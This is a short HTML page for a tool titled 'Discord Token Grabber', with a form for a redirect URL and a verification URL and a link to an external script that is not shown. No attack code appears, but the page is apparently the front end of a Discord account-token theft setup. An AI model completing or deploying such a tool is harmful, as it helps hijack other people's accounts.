<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Token Grabber</title>
</head>
<body>
    <h1>Discord Token Grabber</h1>
    <form id="tokenForm">
        <label for="redirectUrl">Redirect URL:</label>
        <input type="text" id="redirectUrl" name="redirectUrl" required>
        <br>
        <label for="verifyUrl">Verification URL:</label>
        <input type="text" id="verifyUrl" name="verifyUrl" required>
        <br>
        <button type="submit">Submit</button>
    </form>
    <script src="script.js"></script>
</body>
</html>
